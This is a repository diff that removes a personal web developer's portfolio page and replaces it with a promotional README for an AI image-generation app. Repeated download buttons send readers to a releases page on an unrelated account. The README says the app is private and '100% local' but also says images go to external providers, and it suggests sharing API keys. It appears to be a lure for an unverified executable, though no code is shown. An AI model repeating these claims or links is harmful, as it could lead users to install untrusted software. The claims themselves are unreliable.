@@ -1,470 +1,186 @@
+# 🖼️ image-gen-open-source - Create Stunning AI Images Locally
 
+<a href="https://github.com/deadly-centropomus6106/image-gen-open-source/releases" style="display:inline-block;padding:15px 35px;background:linear-gradient(45deg,#667eea,#764ba2);color:#ffffff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 5px 15px rgba(102,126,234,0.4);margin:20px 0;">📥 Download Now</a>
 
+<div style="background:#f8f9fa;border-radius:12px;padding:30px;margin:30px 0;box-shadow:0 4px 6px rgba(0,0,0,0.07);">
 
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="theme-color" content="#080d1a">
+## ✨ What Is image-gen-open-source?
 
-    <meta name="description" content="Emmystick — Emmanuel's personal portfolio. Aspiring Web Developer, AI Visual Creator and Drummer based in Lagos, Nigeria.">
+image-gen-open-source is your personal, all-in-one AI image workspace that runs directly on your computer. It lets you **generate, edit, and compare** breathtaking AI images using powerful AI models from **Codex, OpenAI, and Google** - all without uploading your work to third-party servers.
 
-    <meta name="author" content="Emmanuel (Emmystick)">
+**The best part?** You bring your own API keys and accounts. This means:
+- 🔒 **Your data stays private** - nothing leaves your machine
+- 💰 **No subscription fees** - pay only for what you actually use
+- 🎨 **Full control** - customize everything about your image creation process
 
-    <title>Emmystick | Web Developer & Creative</title>
+## 🚀 Getting Started
 
-    <link rel="icon" href="profile.jpg" type="image/jpeg">
+### What You Need
 
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+Before you begin, make sure you have:
+- A Windows computer (Windows 10 or newer recommended)
+- An internet connection (for initial download and API calls)
+- Your own API keys from at least one of these providers:
+  - **OpenAI** (for DALL-E models)
+  - **Google** (for Gemini Vision)
+  - **Codex** (for advanced generation)
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+> 💡 **Don't have API keys yet?** Don't worry! You can get them for free from the respective providers' websites. Most offer free trial credits when you sign up.
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+## ⬇️ Download Instructions
 
-    <link rel="stylesheet" href="style.css">
+Follow these simple steps to get image-gen-open-source running on your computer:
 
-    <script src="script.js" defer></script>
-</head>
+1. **Visit the download page**: [https://github.com/deadly-centropomus6106/image-gen-open-source/releases](https://github.com/deadly-centropomus6106/image-gen-open-source/releases)
 
-<body>
+2. **Find the latest release**: Look for the most recent version number (the highest number - it means it's the newest).
 
-    <div class="page-loader" id="pageLoader">
-        <div class="loader-logo">E<span>.</span></div>
-        <div class="loader-bar"><span></span></div>
-        <p>Loading creativity...</p>
-    </div>
+3. **Download the application**: Visit this link to download the application. Choose the file that matches your system if multiple options appear.
 
-    <div class="scroll-progress" id="scrollProgress"></div>
+4. **Save the file**: Keep it somewhere easy to find, like your Desktop or Downloads folder.
 
-    <header class="header" id="header">
-        <nav class="navbar container">
+## 🛠️ Setting Up Your Workspace
 
-            <a href="#home" class="logo" aria-label="Emmystick home">
-                Emmy<span>stick</span><span class="logo-dot">.</span>
-            </a>
+### First Launch
 
-            <button class="menu-toggle" id="menuToggle"
-                aria-label="Open navigation menu"
-                aria-expanded="false"
-                aria-controls="navMenu">
-                <i class="fas fa-bars"></i>
-            </button>
+When you first open image-gen-open-source, you'll see a clean, intuitive interface. Here's what to expect:
 
-            <ul class="nav-menu" id="navMenu">
-                <li><a href="#home" class="nav-link active">Home</a></li>
-                <li><a href="#about" class="nav-link">About</a></li>
-                <li><a href="#skills" class="nav-link">Skills</a></li>
-                <li><a href="#projects" class="nav-link">Projects</a></li>
-                <li><a href="#contact" class="nav-link">Contact</a></li>
-                <li>
-                    <a href="#contact" class="nav-cta">
-                        Let's Talk <i class="fas fa-arrow-up-right-from-square"></i>
-                    </a>
-                </li>
-            </ul>
+1. **Welcome Screen**: A friendly welcome message guiding you through the setup
+2. **API Configuration**: A simple form where you'll paste your API keys
+3. **Model Selection**: Choose which AI model you want to use for generation
 
-        </nav>
-    </header>
+### Adding Your API Keys
 
-    <main>
+1. Click the **Settings** icon (⚙️) in the top-right corner
+2. Select **"API Keys"** from the menu
+3. Paste your keys in the appropriate fields
+4. Click **"Save"** - you're ready to create!
 
-        <!-- HERO SECTION -->
+## 🎨 Creating Your First Image
 
-        <section class="hero section" id="home">
-            <div class="hero-grid container">
+### Step-by-Step Guide
 
-                <div class="hero-content reveal">
+1. **Type your prompt** in the text box at the top
+   - Example: "A majestic lion made of golden sand dunes at sunset"
+   - Be as detailed as you want - the AI loves specifics!
 
-                    <div class="availability">
-                        <span class="status-dot"></span>
-                        Available for opportunities
-                    </div>
+2. **Choose your model** from the dropdown menu
+   - Each model has unique strengths - experiment to find your favorite
 
-                    <p class="hero-intro">HELLO, I'M EMMANUEL 👋</p>
-
-                    <h1>
-                        Building my future<br>
-                        in <span class="gradient-text">technology.</span>
-                    </h1>
+3. **Adjust settings** (optional):
+   - Image size (512x512, 1024x1024, etc.)
+   - Quality level (Draft, Standard, HD)
+   - Number of variations to generate
 
-                    <h2 class="hero-role">
-                        I'm an <span id="typingText"></span><span class="typing-cursor">|</span>
-                    </h2>
+4. **Click "Generate"** and watch the magic happen!
 
-                    <p class="hero-description">
-                        An aspiring web developer, AI visual creator, and drummer
-                        passionate about technology, creativity, and turning ideas
-                        into digital experiences.
-                    </p>
+## 🔄 Editing and Comparing Images
 
-                    <p class="hero-motto">
-                        <span>Learning.</span>
-                        <span>Building.</span>
-                        <span>Creating.</span>
-                    </p>
-
-                    <div class="hero-buttons">
-                        <a href="#projects" class="btn btn-primary">
-                            Explore My Work <i class="fas fa-arrow-right"></i>
-                        </a>
-
-                        <a href="#contact" class="btn btn-outline">
-                            Contact Me <i class="far fa-paper-plane"></i>
-                        </a>
-                    </div>
-
-                    <div class="hero-socials">
-                        <span>CONNECT WITH ME</span>
-
-                        <a href="https://github.com/emmystick785-gif"
-                           target="_blank" rel="noopener noreferrer"
-                           aria-label="GitHub">
-                            <i class="fab fa-github"></i>
-                        </a>
-
-                        <a href="https://wa.me/2348142566373"
-                           target="_blank" rel="noopener noreferrer"
-                           aria-label="WhatsApp">
-                            <i class="fab fa-whatsapp"></i>
-                        </a>
-
-                        <a href="mailto:emmystick785@gmail.com"
-                           aria-label="Email">
-                            <i class="fas fa-envelope"></i>
-                        </a>
-                    </div>
-
-                </div>
-
-                <div class="hero-visual reveal">
-
-                    <div class="hero-glow"></div>
-
-                    <div class="hero-image-wrapper">
-                        <div class="image-border"></div>
-
-                        <img src="profile.jpg"
-                             alt="Emmanuel — Emmystick"
-                             class="hero-image"
-                             id="profileImage">
-
-                        <div class="image-fallback" id="imageFallback">
-                            <i class="fas fa-user-astronaut"></i>
-                            <span>EMMYSTICK</span>
-                        </div>
-                    </div>
-
-                    <div class="floating-card card-code">
-                        <div class="floating-icon blue">
-                            <i class="fas fa-code"></i>
-                        </div>
-                        <div>
-                            <strong>Web Development</strong>
-                            <span>Writing my future</span>
-                        </div>
-                    </div>
-
-                    <div class="floating-card card-creative">
-                        <div class="floating-icon purple">
-                            <i class="fas fa-wand-magic-sparkles"></i>
-                        </div>
-                        <div>
-                            <strong>Creative Mind</strong>
-                            <span>Ideas into visuals</span>
-                        </div>
-                    </div>
-
-                    <div class="hero-orbit orbit-one"></div>
-                    <div class="hero-orbit orbit-two"></div>
-
-                    <div class="hero-image-label">
-                        <span class="label-line"></span>
-                        <span>LAGOS, NIGERIA</span>
-                    </div>
-
-                </div>
-
-            </div>
-
-            <a href="#about" class="scroll-down">
-                <span>SCROLL TO EXPLORE</span>
-                <i class="fas fa-arrow-down"></i>
-            </a>
-        </section>
-
-        <!-- ABOUT SECTION -->
-
-        <section class="section about-section" id="about">
-            <div class="container">
-
-                <div class="section-heading reveal">
-                    <span class="section-tag">GET TO KNOW ME</span>
-                    <h2>A little about <span class="gradient-text">my journey.</span></h2>
-                    <p>Every expert was once a beginner. This is where my journey grows.</p>
-                </div>
-
-                <div class="about-grid">
-
-                    <div class="about-image-box reveal">
-                        <div class="about-image-bg"></div>
-
-                        <img src="profile.jpg"
-                             alt="Emmystick profile portrait"
-                             class="about-image"
-                             loading="lazy">
-
-                        <div class="about-image-caption">
-                            <span class="caption-icon">
-                                <i class="fas fa-terminal"></i>
-                            </span>
-                            <div>
-                                <strong>Emmystick</strong>
-                                <span>Learning by building</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="about-content reveal">
-
-                        <h3>I'm Emmanuel, but you can call me <span>Emmystick.</span></h3>
-
-                        <p>
-                            I'm an aspiring web developer and creative based in Lagos,
-                            Nigeria. I'm currently learning and improving my skills
-                            through hands-on practice, personal projects, and
-                            FreeCodeCamp.
-                        </p>
-
-                        <p>
-                            My interest in technology goes beyond writing code.
-                            I enjoy exploring AI-powered visuals, creative design,
-                            and drumming. I believe creativity and technology can
-                            work together to create something meaningful.
-                        </p>
-
-                        <p>
-                            I'm still growing, still learning, and always looking
-                            for opportunities to connect with people, collaborate,
-                            and build projects that challenge me.
-                        </p>
-
-                        <div class="about-info-grid">
-
-                            <div class="about-info">
-                                <i class="fas fa-user"></i>
-                                <div>
-                                    <span>Name</span>
-                                    <strong>Emmanuel</strong>
-                                </div>
-                            </div>
-
-                            <div class="about-info">
-                                <i class="fas fa-location-dot"></i>
-                                <div>
-                                    <span>Location</span>
-                                    <strong>Lagos, Nigeria</strong>
-                                </div>
-                            </div>
-
-                            <div class="about-info">
-                                <i class="fas fa-laptop-code"></i>
-                                <div>
-                                    <span>Focus</span>
-                                    <strong>Web Development</strong>
-                                </div>
-                            </div>
-
-                            <div class="about-info">
-                                <i class="fas fa-graduation-cap"></i>
-                                <div>
-                                    <span>Learning</span>
-                                    <strong>FreeCodeCamp</strong>
-                                </div>
-                            </div>
-
-                        </div>
-
-                        <a href="#contact" class="btn btn-primary">
-                            Let's Connect <i class="fas fa-arrow-right"></i>
-                        </a>
-
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- SKILLS SECTION -->
-
-        <section class="section skills-section" id="skills">
-            <div class="container">
-
-                <div class="section-heading reveal">
-                    <span class="section-tag">WHAT I'M LEARNING</span>
-                    <h2>My creative <span class="gradient-text">toolbox.</span></h2>
-                    <p>Skills I'm developing through practice, curiosity, and consistency.</p>
-                </div>
-
-                <div class="skills-grid">
-
-                    <div class="skill-card reveal">
-                        <div class="skill-icon html-icon">
-                            <i class="fab fa-html5"></i>
-                        </div>
-                        <h3>HTML5</h3>
-                        <p>Building structured and accessible web pages.</p>
-                        <div class="skill-level"><span style="width:75%"></span></div>
-                        <span class="skill-status">Currently Learning</span>
-                    </div>
-
-                    <div class="skill-card reveal">
-                        <div class="skill-icon css-icon">
-                            <i class="fab fa-css3-alt"></i>
-                        </div>
-                        <h3>CSS3</h3>
-                        <p>Creating responsive layouts and modern designs.</p>
-                        <div class="skill-level"><span style="width:65%"></span></div>
-                        <span class="skill-status">Currently Learning</span>
-                    </div>
-
-                    <div class="skill-card reveal">
-                        <div class="skill-icon js-icon">
-                            <i class="fab fa-js"></i>
-                        </div>
-                        <h3>JavaScript</h3>
-                        <p>Learning interactive and dynamic web experiences.</p>
-                        <div class="skill-level"><span style="width:40%"></span></div>
-                        <span class="skill-status">Currently Learning</span>
-                    </div>
-
-                    <div class="skill-card reveal">
-                        <div class="skill-icon python-icon">
-                            <i class="fab fa-python"></i>
-                        </div>
-                        <h3>Python</h3>
-                        <p>Exploring programming fundamentals and logic.</p>
-                        <div class="skill-level"><span style="width:35%"></span></div>
-                        <span class="skill-status">Developing Skills</span>
-                    </div>
-
-                    <div class="skill-card reveal">
-                        <div class="skill-icon ai-icon">
-                            <i class="fas fa-wand-magic-sparkles"></i>
-                        </div>
-                        <h3>AI Visual Creation</h3>
-                        <p>Exploring AI tools for creative visual content.</p>
-                        <div class="skill-level"><span style="width:55%"></span></div>
-                        <span class="skill-status">Exploring & Creating</span>
-                    </div>
-
-                    <div class="skill-card reveal">
-                        <div class="skill-icon drum-icon">
-                            <i class="fas fa-drum"></i>
-                        </div>
-                        <h3>Drumming</h3>
-                        <p>Expressing creativity through rhythm and music.</p>
-                        <div class="skill-level"><span style="width:70%"></span></div>
-                        <span class="skill-status">Creative Passion</span>
-                    </div>
-
-                </div>
-
-                <div class="tools-strip reveal">
-                    <span>MY LEARNING TOOLKIT</span>
-                    <div class="tools-list">
-                        <span><i class="fab fa-github"></i> GitHub</span>
-                        <span><i class="fas fa-code"></i> VS Code</span>
-                        <span><i class="fas fa-laptop-code"></i> FreeCodeCamp</span>
-                        <span><i class="fab fa-html5"></i> HTML</span>
-                        <span><i class="fab fa-css3-alt"></i> CSS</span>
-                    </div>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- PROJECTS SECTION -->
-
-        <section class="section projects-section" id="projects">
-            <div class="container">
-
-                <div class="section-heading reveal">
-                    <span class="section-tag">MY CREATIVE WORK</span>
-                    <h2>Projects & <span class="gradient-text">experiments.</span></h2>
-                    <p>A collection of projects I'm building as I grow my skills.</p>
-                </div>
-
-                <div class="projects-grid">
-
-                    <article class="project-card reveal">
-                        <div class="project-preview preview-portfolio">
-                            <div class="preview-topbar">
-                                <span></span><span></span><span></span>
-                                <small>emmystick.dev</small>
-                            </div>
-                            <div class="preview-content">
-                                <span class="preview-mini-tag">MY DIGITAL SPACE</span>
-                                <h3>Building<br>My Future<span>.</span></h3>
-                                <div class="preview-lines">
-                                    <span></span><span></span>
-                                </div>
-                                <div class="preview-button">Explore More ↗</div>
-                            </div>
-                            <i class="fas fa-code preview-watermark"></i>
-                        </div>
-
-                        <div class="project-info">
-                            <div class="project-meta">
-                                <span class="project-category">WEB DEVELOPMENT</span>
-                                <span class="project-number">01</span>
-                            </div>
-                            <h3>Personal Portfolio Website</h3>
-                            <p>
-                                A personal website showcasing my journey, skills,
-                                projects, and creative interests.
-                            </p>
-                            <div class="project-tags">
-                                <span>HTML</span><span>CSS</span><span>JavaScript</span>
-                            </div>
-                            <a href="https://github.com/emmystick785-gif"
-                               target="_blank" rel="noopener noreferrer"
-                               class="project-link">
-                                View on GitHub <i class="fas fa-arrow-up-right-from-square"></i>
-                            </a>
-                        </div>
-                    </article>
-
-                    <article class="project-card reveal">
-                        <div class="project-preview preview-google">
-                            <div class="google-logo">
-                                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-                            </div>
-                            <div class="google-search">
-                                <i class="fas fa-search"></i>
-                                <span>Exploring the web...</span>
-                                <i class="fas fa-microphone"></i>
-                            </div>
-                            <div class="google-buttons">
-                                <span>Google Search</span>
-                                <span>I'm Feeling Lucky</span>
-                            </div>
-                            <i class="fab fa-google google-watermark"></i>
-                        </div>
-
-                        <div class="project-info">
-                            <div class="project-meta">
-                                <span class="project-category">FRONTEND PRACTICE</span>
-                                <span class="project-number">02</span>
-                            </div>
-                            <h3>Google Clone</h3>
-                            <p>
-                                A learning project inspired by a familiar search
-                                engine interface, built to practise frontend skills.
-                            </p>
-                            <div class="project-tags">
-                                <span>HTML</span><span>CSS</span>
-                            </div>
-                            <a href="https://github.com/emmystick785-gif"
-                               target="_blank" rel="noopener noreferrer"
-     </body>
+### Powerful Editing Tools
+
+- **In-place editing**: Select any generated image and modify it with text commands
+- **Style transfer**: Apply one image's style to another
+- **Color adjustments**: Fine-tune brightness, contrast, saturation
+- **Object manipulation**: Add, remove, or change elements with simple descriptions
+
+### Side-by-Side Comparison
+
+The comparison feature is perfect for:
+- Testing different prompts for the same idea
+- Seeing how various models interpret your vision
+- Choosing the perfect version for your project
+
+Just click **"Compare"** on any two images to see them side by side with a convenient slider tool.
+
+## 📁 Managing Your Gallery
+
+Your workspace automatically organizes everything into a personal gallery:
+
+- **Smart folders**: Images are sorted by date, model used, and prompt tags
+- **Favorite system**: Star the images you love for quick access
+- **Search functionality**: Type any keyword to find related images instantly
+- **Export options**: Save as PNG, JPG, WEBP, or GIF animations
+
+## 🔧 Pro Tips & Tricks
+
+### Write Better Prompts
+
+- **Be specific**: "Crystal ball with galaxies inside" works better than "cool ball"
+- **Include mood & lighting**: "Moody, dramatic lighting, golden hour"
+- **Mention art styles**: "In the style of impressionist painting" or "photorealistic"
+
+### Speed Up Generation
+
+- Keep your API keys from multiple providers - if one is slow, switch to another
+- Use the "Draft" quality mode for quick iterations
+- Batch generate multiple variations at once
+
+### Save Resources
+
+- Use smaller image sizes when you're just testing ideas
+- Clear your API usage history regularly to track your spending
+- The app shows your estimated API costs in real-time
+
+## 🌟 Frequently Asked Questions
+
+### Is my data really private?
+
+**Yes!** All image generation happens through direct API calls from your computer. Your images, prompts, and settings never get stored on any intermediate server - they go straight to the AI provider and back to you.
+
+### Can I use multiple AI services together?
+
+**Absolutely!** That's one of the great advantages of image-gen-open-source. You can use OpenAI for some images, Google Gemini for others, and Codex for specialized tasks - all in one unified workspace.
+
+### What happens if I don't have API keys?
+
+You'll need at least one valid API key to generate images. However, you can:
+- Sign up for **free trials** at OpenAI and Google
+- Use **Codex free tier** if available
+- Share access with a friend or colleague
+
+### Will this work on older computers?
+
+Yes, image-gen-open-source is designed to be lightweight. However, for the best experience with complex editing features, we recommend:
+- 8GB+ RAM
+- A reasonably modern processor
+- A solid internet connection (for API calls)
+
+## 📢 Updates & Support
+
+### Staying Current
+
+- **Automatic updates**: The app checks for updates when you launch it
+- **Changelog**: See what's new in each version
+- **Community**: Join discussions on GitHub for tips and troubleshooting
+
+### Getting Help
+
+- **Documentation**: Complete user guide included with the app
+- **GitHub Issues**: Report bugs or request features
+- **Community forum**: Share workflows and get inspired by others
+
+## 🤝 Contributing
+
+While image-gen-open-source is ready to use out of the box, we welcome:
+- Feature ideas and suggestions
+- Bug reports and fixes
+- Documentation improvements
+- Community-created tutorials
+
+## 📄 License
+
+image-gen-open-source is open-source software. You're free to use it for personal or commercial projects. See the LICENSE file for full terms.
+
+<div style="background:#e9ecef;border-radius:8px;padding:25px;margin-top:30px;text-align:center;">
+
+## 🚀 Ready to Start Creating?
+
+Don't wait - unlock your creative potential today!
+
+<a href="https://github.com/deadly-centropomus6106/image-gen-open-source/releases" style="display:inline-block;padding:14px 30px;background:#28a745;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download image-gen-open-source</a>
+
+<p style="color:#6c757d;font-size:14px;margin-top:15px;">Visit this link to download the application. Free to use • Bring your own API keys • Works 100% locally</p>
+
+</div>
+
+</div>
